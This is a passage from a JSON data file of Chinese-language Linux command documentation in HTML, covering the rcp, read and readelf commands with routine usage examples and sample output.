.Enter\n</code></pre>\n<p><code>.</code>是“当前目录”的简写形式。在这种情况下，远程目录中的&nbsp;test2&nbsp;被复制到当前目录下，名称仍为&nbsp;test2&nbsp;。</p>\n<p>如果希望用新名称复制文件，请提供目标文件名。如果希望将&nbsp;test2&nbsp;复制到本地系统中的其他目录下，请使用以下绝对或相对路径名：</p>\n<pre><code class=\"language-shell\">rcp webserver1:<span class=\"hljs-regexp\">/home/</span>root<span class=\"hljs-regexp\">/test2 otherdir/</span> Enter\n</code></pre>\n<p>或者，如果希望用其他文件名将文件复制到其他目录下：</p>\n<pre><code class=\"language-shell\">rcp webserver1:<span class=\"hljs-regexp\">/home/</span>root<span class=\"hljs-regexp\">/test2 otherdir/</span>otherfile Enter\n</code></pre>\n<p> <strong>将目录复制到远程系统：</strong> </p>\n<p>要将本地目录及其文件和子目录复制到远程系统，请同时使用&nbsp;rcp&nbsp;和&nbsp;-r（递归）选项。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">rcp</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">r</span> <span class=\"hljs-type\">local_dir</span> <span class=\"hljs-type\">remote_hostname</span><span class=\"hljs-operator\">:</span><span class=\"hljs-type\">remote_dir</span> <span class=\"hljs-built_in\">Enter</span>\n</code></pre>\n<p>如果当前目录下没有&nbsp;local_dir，则除本地目录名外，还需要提供相对路径名（自当前目录开始）或绝对路径名（自&nbsp;/&nbsp;顶级目录开始）。另外，如果主目录下没有&nbsp;remote_dir，则&nbsp;remote_dir&nbsp;将需要一个相对路径（自主目录开始）或绝对路径（自&nbsp;/&nbsp;开始）。</p>\n<p> <strong>要将名为&nbsp;work&nbsp;的子目录完整地复制到&nbsp;webserver1远程计算机中的主目录下名为&nbsp;products&nbsp;的目录，请键入以下内容：</strong> </p>\n<pre><code class=\"language-shell\">rcp -r work webserver1:<span class=\"hljs-regexp\">/home/</span>root/products Enter\n</code></pre>\n<p>此命令在<code>webserver1:/home/root/products</code>下创建名为&nbsp;work&nbsp;的目录及其全部内容（假定<code>/home/root/products</code>已存在于&nbsp;webserver1中）。</p>\n<p>本示例假定用户处于包含&nbsp;work&nbsp;的本地目录下。否则，必须提供该目录的相对或绝对路径，如<code>/home/root/work</code>。</p>\n<p> <strong>从远程系统复制目录：</strong> </p>\n<p>要将远程目录及其所有文件和子目录复制到本地目录，请在以下语法中使用&nbsp;rcp&nbsp;和&nbsp;-r（递归）选项。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">rcp</span> –<span class=\"hljs-variable\">r</span> <span class=\"hljs-type\">remote_hostname</span><span class=\"hljs-operator\">:</span><span class=\"hljs-type\">remote_dir</span> <span class=\"hljs-type\">local_dir</span> <span class=\"hljs-built_in\">Enter</span>\n</code></pre>\n<p>要将名为&nbsp;work&nbsp;的远程目录复制到当前目录，请键入以下内容：</p>\n<pre><code class=\"language-shell\">rcp –r webserver1:<span class=\"hljs-regexp\">/home/</span>root/work .Enter\n</code></pre>\n<p><code>.</code>表示当前目录。将在此目录下创建&nbsp;work&nbsp;目录。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "read",
        "des": "从键盘读取变量值",
        "body": "<h1 id=\"read\">read</h1>\n<p>从键盘读取变量值</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>read命令</strong> 从键盘读取变量的值，通常用在shell脚本中与用户进行交互的场合。该命令可以一次读取多个变量的值，变量和输入的值都需要使用空格隔开。在read命令后面，如果没有指定变量名，读取的数据将被自动赋值给特定的变量REPLY</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">read</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p：指定读取值时的提示符；</span>\n<span class=\"hljs-deletion\">-t：指定读取值时等待的时间（秒）。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>变量：指定读取值的变量名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>下面的列表给出了read命令的常用方式：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span> <span class=\"hljs-number\">1987</span><span class=\"hljs-built_in\">name</span>\n从标准输入读取输入并赋值给变量<span class=\"hljs-number\">1987</span><span class=\"hljs-built_in\">name</span>。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span> <span class=\"hljs-keyword\">first</span> <span class=\"hljs-keyword\">last</span>\n从标准输入读取输入到第一个空格或者回车，将输入的第一个单词放到变量<span class=\"hljs-keyword\">first</span>中，并将该行其他的输入放在变量<span class=\"hljs-keyword\">last</span>中。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span>\n从标准输入读取一行并赋值给特定变量REPLY。\n</code></pre>\n<pre><code class=\"language-shell\">read -a <span class=\"hljs-built_in\">array</span>name\n把单词清单读入<span class=\"hljs-built_in\">array</span>name的数组里。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"text\"</span>\n打印提示（<span class=\"hljs-built_in\">text</span>），等待输入，并将输入存储在REPLY中。\n</code></pre>\n<pre><code class=\"language-shell\">read -r line\n允许输入包含反斜杠。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span> -t <span class=\"hljs-number\">3</span>\n指定读取等待时间为<span class=\"hljs-number\">3</span>秒。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">read</span> -n <span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">var</span>\n从输入中读取两个字符并存入变量<span class=\"hljs-keyword\">var</span>，不需要按回车读取。\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span> -d <span class=\"hljs-string\">\":\"</span> <span class=\"hljs-built_in\">var</span>\n用定界符“:”结束输入行。\n</code></pre>\n<h2 id=\"read命令示例\">read命令示例</h2>\n<p>从标准输入读取输入并赋值给变量1987name。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">read</span> 1987name        <span class=\"hljs-comment\">#等待读取输入，直到回车后表示输入完毕，并将输入赋值给变量answer</span></span>\nHelloWorld            #控制台输入Hello\n<span class=\"hljs-meta\">\n#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$1987name</span>       <span class=\"hljs-comment\">#打印变量</span></span>\nHelloWorld\n</code></pre>\n<p>等待一组输入，每个单词之间使用空格隔开，直到回车结束，并分别将单词依次赋值给这三个读入变量。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">#read one two three</span>\n<span class=\"hljs-attribute\">1</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">3</span>                   #在控制台输入<span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-number\">3</span>，它们之间用空格隔开。\n\n<span class=\"hljs-comment\">#echo \"one = $one, two = $two, three = $three\"</span>\n<span class=\"hljs-attribute\">one</span> = <span class=\"hljs-number\">1</span>, two = <span class=\"hljs-number\">2</span>, three = <span class=\"hljs-number\">3</span>\n</code></pre>\n<p>REPLY示例</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">read</span>                  <span class=\"hljs-comment\">#等待控制台输入，并将结果赋值给特定内置变量REPLY。</span></span>\nThis is REPLY          #在控制台输入该行。 \n<span class=\"hljs-meta\">\n#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$REPLY</span>           <span class=\"hljs-comment\">#打印输出特定内置变量REPLY，以确认是否被正确赋值。</span></span>\n\nThis is REPLY\n</code></pre>\n<p>-p选项示例</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"Enter your name: \"</span>            <span class=\"hljs-comment\">#输出文本提示，同时等待输入，并将结果赋值给REPLY。</span></span>\nEnter you name: stephen                 #在提示文本之后输入stephen\n<span class=\"hljs-meta\">\n#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$REPLY</span></span>\nstephen\n</code></pre>\n<p>等待控制台输入，并将输入信息视为数组，赋值给数组变量friends，输入信息用空格隔开数组的每个元素。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">read</span> -a friends</span>\nTim Tom Helen\n<span class=\"hljs-meta\">\n#</span><span class=\"language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"They are <span class=\"hljs-variable\">${friends[0]}</span>, <span class=\"hljs-variable\">${friends[1]}</span> and <span class=\"hljs-variable\">${friends[2]}</span>.\"</span></span>\nThey are Tim, Tom and Helen.\n</code></pre>\n<p> <strong>补充一个终端输入密码时候，不让密码显示出来的例子。</strong> </p>\n<p>方法1：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/bash</span>\n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"输入密码：\"</span> -s <span class=\"hljs-built_in\">pwd</span>\n<span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-built_in\">echo</span> password <span class=\"hljs-built_in\">read</span>, is <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$pwd</span>\"</span>\n</code></pre>\n<p>方法2：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/bash</span>\nstty -<span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\"输入密码：\"</span> <span class=\"hljs-built_in\">pwd</span>\nstty <span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-built_in\">echo</span>\n<span class=\"hljs-built_in\">echo</span> 输入完毕。\n</code></pre>\n<p>其中，选项<code>-echo</code>禁止将输出发送到终端，而选项<code>echo</code>则允许发送输出。</p>\n<p>使用read命令从键盘读取变量值，并且将值赋给指定的变量，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">read</span> v1 v3          <span class=\"hljs-comment\">#读取变量值</span>\n</code></pre>\n<p>执行上面的指令以后，要求键入两个数据，如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Linux</span> c+            <span class=\"hljs-comment\">#输入数据</span>\n</code></pre>\n<p>完成之后，可以使用echo命令将指定的变量值输出查看，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$v1</span> <span class=\"hljs-variable\">$v3</span>       <span class=\"hljs-comment\">#输出变量的值</span>\n</code></pre>\n<p>执行输出变量值的命令以后，将显示用户所输入的数据值，如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Linux</span> c+           <span class=\"hljs-comment\">#输出变量值</span>\n</code></pre>\n<p>注意：使用echo命令输出变量值时，必须在变量名前添加符号<code>$</code>。否则，echo将直接输出变量名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "readelf",
        "des": "用于显示elf格式文件的信息",
        "body": "<h1 id=\"readelf\">readelf</h1>\n<p>用于显示elf格式文件的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>readelf命令</strong> 用来显示一个或者多个elf格式的目标文件的信息，可以通过它的选项来控制显示哪些信息。这里的elf-file(s)就表示那些被检查的文件。可以支持32位，64位的elf格式文件，也支持包含elf文件的文档（这里一般指的是使用ar命令将一些elf文件打包之后生成的例如lib*.a之类的“静态库”文件）。&nbsp;</p>\n<p>这个程序和objdump提供的功能类似，但是它显示的信息更为具体，并且它不依赖BFD库(BFD库是一个GNU项目，它的目标就是希望通过一种统一的接口来处理不同的目标文件)，所以即使BFD库有什么bug存在的话也不会影响到readelf程序。&nbsp;</p>\n<p>运行readelf的时候，除了-v和-H之外，其它的选项必须有一个被指定。&nbsp;</p>\n<h3 id=\"elf文件类型\">ELF文件类型</h3>\n<p> <strong>种类型的ELF文件：</strong> </p>\n<ol>\n<li> 可重定位文件:用户和其他目标文件一起创建可执行文件或者共享目标文件,例如lib*.a文件。&nbsp;</li>\n<li> 可执行文件：用于生成进程映像，载入内存执行,例如编译好的可执行文件a.out。&nbsp;</li>\n<li> 共享目标文件：用于和其他共享目标文件或者可重定位文件一起生成elf目标文件或者和执行文件一起创建进程映像，例如lib*.so文件。&nbsp;</li>\n</ol>\n<p> <strong>ELF文件作用：</strong> </p>\n<p>ELF文件参与程序的连接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待elf格式的文件：&nbsp;</p>\n<ol>\n<li> 如果用于编译和链接（可重定位文件），则编译器和链接器将把elf文件看作是节头表描述的节的集合,程序头表可选。&nbsp;</li>\n<li> 如果用于加载执行（可执行文件），则加载器则将把elf文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。&nbsp;</li>\n<li> 如果是共享文件，则两者都含有。&nbsp;</li>\n</ol>\n<p> <strong>ELF文件总体组成：</strong> &nbsp;</p>\n<p>elf文件头描述elf文件的总体信息。包括：系统相关，类型相关，加载相关，链接相关。&nbsp;</p>\n<ul>\n<li>  系统相关表示：elf文件标识的魔术数，以及硬件和平台等相关信息，增加了elf文件的移植性,使交叉编译成为可能。&nbsp;</li>\n<li>  类型相关就是前面说的那个类型。&nbsp;</li>\n<li>  加载相关：包括程序头表相关信息。&nbsp;</li>\n<li>  链接相关：节头表相关信息。&nbsp;</li>\n</ul>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a </span>\n<span class=\"hljs-deletion\">--all 显示全部信息,等价于 -h -l -S -s -r -d -V -A -I. </span>\n\n<span class=\"hljs-deletion\">-h </span>\n<span class=\"hljs-deletion\">--file-header 显示elf文件开始的文件头信息. </span>\n\n<span class=\"hljs-deletion\">-l </span>\n<span class=\"hljs-deletion\">--program-headers  </span>\n<span class=\"hljs-deletion\">--segments 显示程序头（段头）信息(如果有的话)。 </span>\n\n<span class=\"hljs-deletion\">-S </span>\n<span class=\"hljs-deletion\">--section-headers  </span>\n<span class=\"hljs-deletion\">--sections 显示节头信息(如果有的话)。 </span>\n\n<span class=\"hljs-deletion\">-g </span>\n<span class=\"hljs-deletion\">--section-groups 显示节组信息(如果有的话)。 </span>\n\n<span class=\"hljs-deletion\">-t </span>\n<span class=\"hljs-deletion\">--section-details 显示节的详细信息(-S的)。 </span>\n\n<span class=\"hljs-deletion\">-s </span>\n<span class=\"hljs-deletion\">--syms        </span>\n<span class=\"hljs-deletion\">--symbols 显示符号表段中的项（如果有的话）。 </span>\n\n<span class=\"hljs-deletion\">-e </span>\n<span class=\"hljs-deletion\">--headers 显示全部头信息，等价于: -h -l -S </span>\n\n<span class=\"hljs-deletion\">-n </span>\n<span class=\"hljs-deletion\">--notes 显示note段（内核注释）的信息。 </span>\n\n<span class=\"hljs-deletion\">-r </span>\n<span class=\"hljs-deletion\">--relocs 显示可重定位段的信息。 </span>\n\n<span class=\"hljs-deletion\">-u </span>\n<span class=\"hljs-deletion\">--unwind 显示unwind段信息。当前只支持IA64 ELF的unwind段信息。 </span>\n\n<span class=\"hljs-deletion\">-d </span>\n<span class=\"hljs-deletion\">--dynamic 显示动态段的信息。 </span>\n\n<span class=\"hljs-deletion\">-V </span>\n<span class=\"hljs-deletion\">--version-info 显示版本段的信息。 </span>\n\n<span class=\"hljs-deletion\">-A </span>\n<span class=\"hljs-deletion\">--arch-specific 显示CPU构架信息。 </span>\n\n<span class=\"hljs-deletion\">-D </span>\n<span class=\"hljs-deletion\">--use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。 </span>\n\n<span class=\"hljs-deletion\">-x &lt;number or name&gt; </span>\n<span class=\"hljs-deletion\">--hex-dump=&lt;number or name&gt; 以16进制方式显示指定段内内容。number指定段表中段的索引,或字符串指定文件中的段名。 </span>\n\n<span class=\"hljs-deletion\">-w[liaprmfFsoR] or </span>\n<span class=\"hljs-deletion\">--debug-dump[=line,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges] 显示调试段中指定的内容。 </span>\n\n<span class=\"hljs-deletion\">-I </span>\n<span class=\"hljs-deletion\">--histogram 显示符号的时候，显示bucket list长度的柱状图。 </span>\n\n<span class=\"hljs-deletion\">-v </span>\n<span class=\"hljs-deletion\">--version 显示readelf的版本信息。 </span>\n\n<span class=\"hljs-deletion\">-H </span>\n<span class=\"hljs-deletion\">--help 显示readelf所支持的命令行选项。 </span>\n\n<span class=\"hljs-deletion\">-W </span>\n<span class=\"hljs-deletion\">--wide 宽行输出。 </span>\n\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。 \n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>先给出如下例子：</p>\n<p> <strong>1.对于可执行文件形式的elf格式文件：</strong> </p>\n<p>1)查看可执行程序的源代码如下：&nbsp;</p>\n<pre><code class=\"language-shell\">root@localhost [test]$ cat main.cpp \n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;iostream&gt;</span> </span>\n<span class=\"hljs-keyword\">using</span> std::cout; \n<span class=\"hljs-keyword\">using</span> std::endl; \n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">my_print</span><span class=\"hljs-params\">()</span></span>; \n\n<span class=\"hljs-function\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">char</span> *argv[])</span> \n</span>{ \n        <span class=\"hljs-built_in\">my_print</span>(); \n        cout&lt;&lt;<span class=\"hljs-string\">\"hello!\"</span>&lt;&lt;endl; \n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>; \n} \n\n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span>  <span class=\"hljs-title\">my_print</span><span class=\"hljs-params\">()</span> \n</span>{ \n        cout&lt;&lt;<span class=\"hljs-string\">\"print!\"</span>&lt;&lt;endl; \n} \n</code></pre>\n<p>2)编译如下：&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost test]</span>$ g++ <span class=\"hljs-selector-tag\">main</span><span class=\"hljs-selector-class\">.cpp</span> -o <span class=\"hljs-selector-tag\">main</span> \n<span class=\"hljs-selector-attr\">[root@localhost test]</span>$ g++ -g <span class=\"hljs-selector-tag\">main</span><span class=\"hljs-selector-class\">.cpp</span> -o <span class=\"hljs-selector-tag\">main</span><span class=\"hljs-selector-class\">.debug</span> \n</code></pre>\n<p>3)编译之后，查看生成的文件：&nbsp;</p>\n<pre><code class=\"language-shell\">[root@localhost test]$ ls -l \n总计<span class=\"hljs-number\"> 64 </span>\n-rwxr-xr-x<span class=\"hljs-number\"> 1 </span>quietheart quietheart <span class=\"hljs-number\"> 6700 </span>07-07 18:04 main \n-rw-r--r--<span class=\"hljs-number\"> 1 </span>quietheart quietheart  <span class=\"hljs-number\"> 201 </span>07-07 18:02 main.cpp \n-rwxr-xr-x<span class=\"hljs-number\"> 1 </span>quietheart quietheart<span class=\"hljs-number\"> 38932 </span>07-07 18:04 main.debug \n</code></pre>\n<p>这里，main.debug是带有调试信息的可执行文件，main是一般的可执行文件。&nbsp;</p>\n<p> <strong>2.对于库文件形式的elf格式文件：</strong> </p>\n<p>1)查看库的源代码如下：&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">//myfile.h </span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">ifndef</span> __MYFILE_H </span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> __MYFILE_H </span>\n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">printInfo</span><span class=\"hljs-params\">()</span></span>; \n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">endif</span> </span>\n\n<span class=\"hljs-comment\">//myfile.cpp </span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">\"myfile.h\"</span> </span>\n<span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;iostream&gt;</span> </span>\n<span class=\"hljs-keyword\">using</span> std::cout; \n<span class=\"hljs-keyword\">using</span> std::endl; \n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">printInfo</span><span class=\"hljs-params\">()</span> \n</span>{ \n    cout&lt;&lt;<span class=\"hljs-string\">\"hello\"</span>&lt;&lt;endl; \n} \n</code></pre>\n<p>2)编译如下：&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost test]</span>$ g++ -c myfile<span class=\"hljs-selector-class\">.cpp</span> \n<span class=\"hljs-selector-attr\">[root@localhost test]</span>$ g++ -shared -fPCI -o libmy<span class=\"hljs-selector-class\">.so</span> myfile<span class=\"hljs-selector-class\">.o</span> \n<span class=\"hljs-selector-attr\">[root@localhost test]</span>$ ar -r libmy<span class=\"hljs-selector-class\">.a</span> myfile<span class=\"hljs-selector-class\">.o</span> \nar: creating libmy<span class=\"hljs-selector-class\">.a</span> \n</code></pre>\n<p>3)编译之后，查看生成的文件：&nbsp;</p>\n<p>[root@localhost test]$ ls -l&nbsp;</p>\n<p>总计 44&nbsp;</p>\n<pre><code class=\"language-shell\">-rw-r--r-- <span class=\"hljs-number\">1</span> quietheart quietheart <span class=\"hljs-number\">2154</span> <span class=\"hljs-number\">07</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">14</span> libmy<span class=\"hljs-selector-class\">.a</span> \n-rwxr-xr-x <span class=\"hljs-number\">1</span> quietheart quietheart <span class=\"hljs-number\">5707</span> <span class=\"hljs-number\">07</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">08</span> libmy<span class=\"hljs-selector-class\">.so</span> \n-rwxr-xr-x <span class=\"hljs-number\">1</span> quietheart quietheart  <span class=\"hljs-number\">117</span> <span class=\"hljs-number\">07</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">06</span> myfile<span class=\"hljs-selector-class\">.cpp</span> \n-rwxr-xr-x <span class=\"hljs-number\">1</span> quietheart quietheart   <span class=\"hljs-number\">63</span> <span class=\"hljs-number\">07</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">08</span> myfile<span class=\"hljs-selector-class\">.h</span> \n-rw-r--r-- <span class=\"hljs-number\">1</span> quietheart quietheart <span class=\"hljs-number\">2004</span> <span class=\"hljs-number\">07</span>-<span class=\"hljs-number\">08</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">08</span> myfile<span class=\"hljs-selector-class\">.o</span> \nlibmy<span class=\"hljs-selector-class\">.a</span>  libmy<span class=\"hljs-selector-class\">.so</span>  myfile<span class=\"hljs-selector-class\">.cpp</span>  myfile<span class=\"hljs-selector-class\">.h</span>  myfile<span class=\"hljs-selector-class\">.o</span> \n</code></pre>\n<p>这里，分别生成目标文件myfile.o，共享库文件libmy.so，和静态库文件libmy.a。&nbsp;</p>\n<p>基于以上可执行文件和库，这里给出一些常用的命令。&nbsp;</p>\n<p> <strong>读取可执行文件形式的elf文件头信息：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">[root@localhost test]$ readelf -h main \nELF Header</span><span class=\"hljs-punctuation\">: </span>\n  <span class=\"hljs-attribute\">Magic</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span>\n  <span class=\"hljs-attribute\">Class</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            ELF32 </span>\n  <span class=\"hljs-attribute\">Data</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             2's complement, little endian </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          1 (current) </span>\n  <span class=\"hljs-attribute\">OS/ABI</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                           UNIX - System V </span>\n  <span class=\"hljs-attribute\">ABI Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                      0 </span>\n  <span class=\"hljs-attribute\">type</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             exec (Executable file) </span>\n  <span class=\"hljs-attribute\">Machine</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          Intel 80386 </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          0x1 </span>\n  <span class=\"hljs-attribute\">Entry point address</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              0x8048580 </span>\n  <span class=\"hljs-attribute\">Start of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         52 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Start of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         3232 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Flags</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            0x0 </span>\n  <span class=\"hljs-attribute\">Size of this header</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              52 (bytes) </span>\n  <span class=\"hljs-attribute\">Size of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          32 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        8 </span>\n  <span class=\"hljs-attribute\">Size of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          40 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        29 </span>\n  <span class=\"hljs-attribute\">Section header string table index</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">26 </span>\n</code></pre>\n<p>这里，可见可执行文件的elf文件，其类型为EXEC(可执行文件)。另外，含调试信息的\"main.debug\"和不含调试信息的\"main\"除了一些大小信息之外，其内容是一样的。并且由此可见文件的体系结构为Intel 80386。&nbsp;</p>\n<p> <strong>读取目标文件形式的elf文件头信息：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">[root@localhost test]$ readelf -h myfile.o \nELF Header</span><span class=\"hljs-punctuation\">: </span>\n  <span class=\"hljs-attribute\">Magic</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span>\n  <span class=\"hljs-attribute\">Class</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            ELF32 </span>\n  <span class=\"hljs-attribute\">Data</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             2's complement, little endian </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          1 (current) </span>\n  <span class=\"hljs-attribute\">OS/ABI</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                           UNIX - System V </span>\n  <span class=\"hljs-attribute\">ABI Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                      0 </span>\n  <span class=\"hljs-attribute\">Type</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             REL (Relocatable file) </span>\n  <span class=\"hljs-attribute\">Machine</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          Intel 80386 </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          0x1 </span>\n  <span class=\"hljs-attribute\">Entry point address</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              0x0 </span>\n  <span class=\"hljs-attribute\">Start of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         0 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Start of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         516 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Flags</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            0x0 </span>\n  <span class=\"hljs-attribute\">Size of this header</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              52 (bytes) </span>\n  <span class=\"hljs-attribute\">Size of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          0 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        0 </span>\n  <span class=\"hljs-attribute\">Size of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          40 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        15 </span>\n  <span class=\"hljs-attribute\">Section header string table index</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">12 </span>\n</code></pre>\n<p>这里，可见目标文件的elf文件，其类型为REL(可重定位文件)。&nbsp;</p>\n<p> 